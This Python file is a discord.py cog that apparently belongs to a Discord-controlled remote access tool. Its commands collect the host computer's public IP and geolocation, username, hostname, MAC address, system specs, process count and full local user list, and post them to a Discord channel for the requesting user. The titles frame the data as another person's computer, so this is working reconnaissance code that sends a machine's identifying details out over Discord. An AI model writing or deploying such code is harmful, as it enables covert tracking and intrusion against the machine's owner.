import platform

import discord
import requests
import getpass
import os
from datetime import datetime
from discord.ext import commands

import platform
import socket
import re
import uuid
import psutil
import pwd
import textwrap

from src.database.manager.main import users


class Information(commands.Cog, description="System Information"):

    def __init__(self, client: commands.Bot):
        self.client = client

    @commands.command()
    async def geolocate(self, ctx):
        try:
            r = requests.get(f"https://ipapi.co/json")
            data = r.json()
        except:
            await ctx.send("Request or result error with `ipapi.co`")
            return

        google_maps_url = f'https://maps.google.com/?q={data["latitude"]},{data["longitude"]}'
        information = f"""IP Address:  `{data["ip"]}`
City:  `{data["city"]}`
Region:  `{data["region"]}`
Country:  `{data["country_name"]}`
Latitude:  `{data["latitude"]}`
Longitude:  `{data["longitude"]}`
Time Zone:  `{data["timezone"]}`
UTC Offset:  `{data["utc_offset"]}`
Postal Code:  `{data["postal"]}`
ISP:  `{data["org"]}`
ASN:  `{data["asn"]}`
Country Code:  `{data["country_code"]}`
Country TLD:  `{data["country_tld"]}`
Population:  `{data["country_population"]}`
Currency:  `{data["currency"]}`
Currency Name:  `{data["currency_name"]}`
Country Area:  `{data["country_area"]}`
Languages:  `{data["languages"]}`
Calling code:  `{data["country_calling_code"]}`
Google Maps:  {google_maps_url}"""

        embed = discord.Embed(
            title="Location Data from IP",
            url=google_maps_url,
            description="",
            timestamp=datetime.utcnow(),
            color=0xFF5733
        )
        embed.set_thumbnail(
            url="https://cdn.discordapp.com/attachments/877796755234783273/966379168717750322/unknown.png")

        embed.add_field(
            name=f"{getpass.getuser()}'s Location data", value=information, inline=False)
        embed.set_footer(
            text=f'Requested by {ctx.author.name}',
            icon_url=ctx.author.avatar_url
        )
        await ctx.send(embed=embed)
        return

    @commands.command()
    async def info(self, ctx):
        if os.name == 'nt':
            await ctx.send("Still Under Development")
            return
        else:
            base_information = f"""
System: `{platform.system()}`
Platform: `{platform.platform()}`
Platform Release: `{platform.release()}`
Platform Version: `{platform.version()}`
Processor: `{platform.processor()}`
Architecture: `{platform.machine()}`
RAM: `{round(psutil.virtual_memory().total / (1024.0 ** 3))} GB`
Hostname: `{socket.gethostname()}`
Mac Address: `{':'.join(re.findall('..','%012x' % uuid.getnode()))}`
"""

            embed = discord.Embed(
                title=f"{getpass.getuser()}'s System Information",
                description="",
                timestamp=datetime.utcnow(),
                color=0xFF5733
            )
            embed.set_thumbnail(
                url="https://cdn.discordapp.com/attachments/877796755234783273/966386389249818704/unknown.png")
            embed.add_field(name="Base Information",
                            value=base_information, inline=False)
            embed.add_field(name="Uptime",
                            value=f'`{datetime.fromtimestamp(psutil.boot_time())}`', inline=False)

            # Processes
            try:
                pids = []
                for subdir in os.listdir('/proc'):
                    if subdir.isdigit():
                        pids.append(subdir)
                embed.add_field(name="Total number of processes",
                                value='`{0} Processes`'.format(len(pids)), inline=False)
            except:
                pass

            embed.set_footer(
                text=f'Requested by {ctx.author.name}',
                icon_url=ctx.author.avatar_url
            )
            await ctx.send(embed=embed)

    @commands.command()
    async def users(self, ctx):
        if os.name == 'nt':
            # https://stackoverflow.com/questions/56300490/how-to-get-all-windows-linux-user-and-not-only-current-user-with-python
            pass
        else:
            # Users
            try:
                final_users_text = "`Name` **|** `Shell` **|** `Dir`\n"
                users = pwd.getpwall()
                for user in users:
                    final_users_text += f'{user.pw_name} | {user.pw_shell} | {user.pw_dir}\n'

                for chunk in textwrap.wrap(final_users_text, 4096, replace_whitespace=False):
                    embed = discord.Embed(
                        title=f"Users List of {getpass.getuser()}'s computer",
                        description=chunk,
                        timestamp=datetime.utcnow(),
                        color=0xFF5733
                    )
                    embed.set_thumbnail(
                        url="https://cdn.discordapp.com/attachments/877796755234783273/966386389249818704/unknown.png")
                    await ctx.send(embed=embed)

                    embed.set_footer(
                        text=f'Requested by {ctx.author.name}',
                        icon_url=ctx.author.avatar_url
                    )
                    await ctx.send(embed=embed)

                return
            except Exception as e:
                await ctx.send(str(e))
                return


def setup(client: commands.Bot):
    client.add_cog(Information(client))
